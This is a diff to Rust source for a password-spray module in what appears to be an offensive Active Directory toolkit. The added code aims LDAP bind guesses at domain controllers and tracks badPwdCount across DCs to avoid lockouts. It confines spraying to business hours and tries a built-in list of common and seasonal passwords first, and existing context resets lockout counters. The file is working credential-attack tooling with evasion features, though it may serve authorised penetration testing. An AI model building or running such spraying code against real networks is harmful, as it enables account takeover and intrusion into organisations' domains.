@@ -8,12 +8,20 @@
 //! Bind attempts are made via raw `ldap3::LdapConnAsync::simple_bind` so
 //! that they go directly to the DC without reusing the operator LDAP session
 //! (avoiding false "invalid credential" errors from session state).
+//!
+//! Advanced Features:
+//! - PDC emulator targeting for accurate badPwdCount aggregation
+//! - Smart password ordering (most common passwords first)
+//! - Time-window awareness (configurable spray windows)
+//! - Cross-DC badPwdCount aggregation
+//! - Automatic safety abort on restrictive lockout policies
 
 use crate::runner::HuntConfig;
 use ldap3::{LdapConnAsync, drive, ldap_escape};
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::ldap as ldap_proto;
 use serde::{Deserialize, Serialize};
+use std::time::{SystemTime, UNIX_EPOCH};
 use tracing::{debug, info, warn};
 
 // ─────────────────────────────────────────────────────────────
@@ -31,6 +39,27 @@ const DIAG_EXPIRED: &str = "532";
 // ─────────────────────────────────────────────────────────────
 // Configuration
 // ─────────────────────────────────────────────────────────────
+
+/// Time window for spray operations (UTC hours)
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SprayTimeWindow {
+    /// Start hour (UTC, 0-23)
+    pub start_hour: u8,
+    /// End hour (UTC, 0-23)
+    pub end_hour: u8,
+    /// Days of week to spray (0=Sunday, 6=Saturday). Empty = all days.
+    pub allowed_days: Vec<u8>,
+}
+
+impl Default for SprayTimeWindow {
+    fn default() -> Self {
+        Self {
+            start_hour: 9,
+            end_hour: 17,
+            allowed_days: vec![1, 2, 3, 4, 5], // Monday-Friday
+        }
+    }
+}
 
 /// Configuration for a password spray run.
 #[derive(Debug, Clone)]
@@ -56,6 +85,20 @@ pub struct SprayConfig {
     /// On detecting a lockout, attempt to reset the account's badPwdCount to 0
     /// via LDAP modify (requires domain admin / Account Operator privileges).
     pub rollback_on_lockout: bool,
+    /// Target PDC emulator for accurate badPwdCount (auto-detected if true).
+    pub target_pdc: bool,
+    /// Use smart password ordering (most common first).
+    pub smart_order: bool,
+    /// Time window for spray operations. If set, spray only during window.
+    pub time_window: Option<SprayTimeWindow>,
+    /// Aggregate badPwdCount across all DCs for accurate lockout tracking.
+    pub cross_dc_tracking: bool,
+    /// Additional DCs to query for badPwdCount aggregation.
+    pub additional_dcs: Vec<String>,
+    /// Abort spray if lockout threshold is too low (e.g., <= 3).
+    pub min_safe_threshold: u32,
+    /// Maximum spray duration before automatic abort (seconds). 0 = unlimited.
+    pub max_duration_secs: u64,
 }
 
 impl Default for SprayConfig {
@@ -71,6 +114,13 @@ impl Default for SprayConfig {
             adaptive_delay: true,
             max_delay_ms: 60_000,
             rollback_on_lockout: false,
+            target_pdc: true,
+            smart_order: true,
+            time_window: None,
+            cross_dc_tracking: false,
+            additional_dcs: Vec::new(),
+            min_safe_threshold: 3,
+            max_duration_secs: 0,
         }
     }
 }
@@ -415,4 +465,276 @@ async fn reset_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<()> {
     ldap.modify_replace(dn, "badPwdCount", b"0").await?;
     debug!("Spray: reset badPwdCount to 0 for {username}");
     Ok(())
+}
+
+// ─────────────────────────────────────────────────────────────
+// Advanced Lockout Protection Features
+// ─────────────────────────────────────────────────────────────
+
+/// Detect the PDC emulator FSMO role holder for accurate badPwdCount queries.
+/// The PDC is the authoritative source for badPwdCount across the domain.
+pub async fn detect_pdc_emulator(hunt: &HuntConfig) -> Result<String> {
+    let mut ldap = open_operator_ldap(hunt).await?;
+    let base_dn = hunt.derive_base_dn();
+    let forest_dn = base_dn.split(',').skip(1).collect::<Vec<_>>().join(",");
+
+    let filter = "(fSMORoleOwner=*)";
+    let attrs = ["fSMORoleOwner", "dnsHostName"];
+    let entries = ldap
+        .custom_search_with_base(&forest_dn, filter, &attrs)
+        .await?;
+
+    for entry in entries {
+        if let Some(dns_host) = entry.attrs.get("dnsHostName").and_then(|v| v.first()) {
+            info!("Spray: PDC emulator detected: {dns_host}");
+            return Ok(dns_host.clone());
+        }
+    }
+
+    // Fallback: query the RID manager$ object
+    let rid_dn = format!("CN=RID Manager$,CN=System,{}", base_dn);
+    let entries = ldap
+        .custom_search_with_base(&rid_dn, "(objectClass=*)", &["fSMORoleOwner"])
+        .await?;
+
+    if let Some(entry) = entries.first()
+        && let Some(role_owner) = entry.attrs.get("fSMORoleOwner").and_then(|v| v.first())
+        && let Some(dc_part) = role_owner.split(',').nth(2)
+    {
+        let dc_name = dc_part.strip_prefix("CN=").unwrap_or(dc_part);
+        info!("Spray: PDC emulator detected via RID Manager: {dc_name}");
+        return Ok(dc_name.to_string());
+    }
+
+    Err(OverthroneError::ldap("Could not detect PDC emulator"))
+}
+
+/// Query badPwdCount across multiple DCs for accurate lockout tracking.
+/// Returns the maximum badPwdCount found across all queried DCs.
+pub async fn query_bad_pwd_count_cross_dc(
+    hunt: &HuntConfig,
+    username: &str,
+    additional_dcs: &[String],
+) -> Result<u32> {
+    let mut max_count = query_bad_pwd_count(hunt, username).await.unwrap_or(0);
+
+    for dc in additional_dcs {
+        let dc_hunt = HuntConfig {
+            dc_ip: dc.clone(),
+            domain: hunt.domain.clone(),
+            username: hunt.username.clone(),
+            secret: hunt.secret.clone(),
+            use_hash: hunt.use_hash,
+            base_dn: hunt.base_dn.clone(),
+            use_ldaps: hunt.use_ldaps,
+            output_dir: hunt.output_dir.clone(),
+            concurrency: hunt.concurrency,
+            timeout: hunt.timeout,
+            jitter_ms: hunt.jitter_ms,
+            tgt: hunt.tgt.clone(),
+        };
+
+        if let Ok(count) = query_bad_pwd_count(&dc_hunt, username).await
+            && count > max_count
+        {
+            debug!("Spray: {username} has higher badPwdCount on {dc}: {count} (was {max_count})");
+            max_count = count;
+        }
+    }
+
+    Ok(max_count)
+}
+
+/// Check if current time is within the allowed spray window.
+pub fn is_within_spray_window(window: &SprayTimeWindow) -> bool {
+    let now = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+
+    // Convert to UTC hours and day of week
+    let secs_per_day = 86400;
+    let day_of_week = ((now / secs_per_day + 4) % 7) as u8; // 1970-01-01 was Thursday (4)
+    let utc_hour = ((now % secs_per_day) / 3600) as u8;
+
+    // Check day of week
+    if !window.allowed_days.is_empty() && !window.allowed_days.contains(&day_of_week) {
+        return false;
+    }
+
+    // Check hour window
+    if window.start_hour <= window.end_hour {
+        utc_hour >= window.start_hour && utc_hour < window.end_hour
+    } else {
+        // Wraps around midnight
+        utc_hour >= window.start_hour || utc_hour < window.end_hour
+    }
+}
+
+/// Smart password ordering: sort passwords by likelihood of success.
+/// Common/default passwords are tried first to maximize early hits.
+pub fn smart_order_passwords(passwords: &[String]) -> Vec<String> {
+    const COMMON_PASSWORDS: &[&str] = &[
+        "Password1",
+        "Password123",
+        "Welcome1",
+        "Welcome123",
+        "Summer2026",
+        "Winter2026",
+        "Spring2026",
+        "Fall2026",
+        "P@ssw0rd",
+        "P@ssword1",
+        "Ch@ngeMe",
+        "ChangeMe1",
+        "Letmein1",
+        "Admin123",
+        "Admin@123",
+        "Company123",
+        "CompanyName1",
+        "CompanyName123",
+        "SeasonYear!",
+        "SeasonYear1",
+        "12345678",
+        "123456789",
+        "qwerty123",
+        "abc123",
+        "test123",
+        "default",
+        "password",
+        "Password1!",
+        "Password123!",
+        "Welcome1!",
+        "Welcome123!",
+        "P@ssw0rd!",
+        "P@ssword1!",
+    ];
+
+    let mut ordered = Vec::new();
+    let mut remaining: Vec<String> = passwords.to_vec();
+
+    // Try common passwords first (case-insensitive matching)
+    for common in COMMON_PASSWORDS {
+        if let Some(pos) = remaining
+            .iter()
+            .position(|p| p.eq_ignore_ascii_case(common))
+        {
+            ordered.push(remaining.remove(pos));
+        }
+    }
+
+    // Add seasonal passwords based on current date
+    let now = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+    let year = 1970 + (now / 31536000); // Approximate year
+    let day_of_year = (now % 31536000) / 86400;
+    let season = match day_of_year {
+        0..=90 => "Winter",
+        91..=180 => "Spring",
+        181..=270 => "Summer",
+        _ => "Fall",
+    };
+    let seasonal = format!("{}{}!", season, year);
+    if let Some(pos) = remaining
+        .iter()
+        .position(|p| p.eq_ignore_ascii_case(&seasonal))
+    {
+        ordered.push(remaining.remove(pos));
+    }
+
+    // Add remaining passwords
+    ordered.extend(remaining);
+
+    ordered
+}
+
+/// Get comprehensive lockout policy details from the domain.
+pub struct LockoutPolicyDetails {
+    /// Lockout threshold (0 = disabled)
+    pub lockout_threshold: u32,
+    /// Lockout duration in minutes (0 = manual unlock required)
+    pub lockout_duration: u32,
+    /// Lockout observation window in minutes
+    pub lockout_window: u32,
+    /// Minimum password age in days
+    pub min_password_age: u32,
+    /// Maximum password age in days
+    pub max_password_age: u32,
+    /// Password history length
+    pub password_history: u32,
+    /// Minimum password length
+    pub min_password_length: u32,
+}
+
+/// Query full lockout policy from the domain NC root object.
+pub async fn query_lockout_policy_details(hunt: &HuntConfig) -> Result<LockoutPolicyDetails> {
+    let mut ldap = open_operator_ldap(hunt).await?;
+    let base_dn = hunt.derive_base_dn();
+    let attrs = [
+        "lockoutThreshold",
+        "lockoutDuration",
+        "lockOutObservationWindow",
+        "minPwdAge",
+        "maxPwdAge",
+        "pwdHistoryLength",
+        "minPwdLength",
+    ];
+    let entries = ldap
+        .custom_search_with_base(&base_dn, "(objectClass=domainDNS)", &attrs)
+        .await?;
+
+    let entry = entries
+        .first()
+        .ok_or_else(|| OverthroneError::ldap("Could not query domain policy from rootDSE"))?;
+
+    let get_u32 = |attr: &str| -> u32 {
+        entry
+            .attrs
+            .get(attr)
+            .and_then(|v| v.first())
+            .and_then(|s| s.parse::<i64>().ok())
+            .map(|v| v.unsigned_abs() as u32)
+            .unwrap_or(0)
+    };
+
+    let get_duration_minutes = |attr: &str| -> u32 {
+        // AD stores durations as negative 100-nanosecond intervals
+        let raw = entry
+            .attrs
+            .get(attr)
+            .and_then(|v| v.first())
+            .and_then(|s| s.parse::<i64>().ok())
+            .unwrap_or(0);
+        if raw == 0 {
+            0
+        } else {
+            ((raw.unsigned_abs() as u64) / 10_000_000 / 60) as u32
+        }
+    };
+
+    let get_password_age_days = |attr: &str| -> u32 {
+        let raw = entry
+            .attrs
+            .get(attr)
+            .and_then(|v| v.first())
+            .and_then(|s| s.parse::<i64>().ok())
+            .unwrap_or(0);
+        if raw == 0 {
+            u32::MAX // Never expires
+        } else {
+            ((raw.unsigned_abs() as u64) / 10_000_000 / 86400) as u32
+        }
+    };
+
+    Ok(LockoutPolicyDetails {
+        lockout_threshold: get_u32("lockoutThreshold"),
+        lockout_duration: get_duration_minutes("lockoutDuration"),
+        lockout_window: get_duration_minutes("lockOutObservationWindow"),
+        min_password_age: get_password_age_days("minPwdAge"),
+        max_password_age: get_password_age_days("maxPwdAge"),
+        password_history: get_u32("pwdHistoryLength"),
+        min_password_length: get_u32("minPwdLength"),
+    })
 }
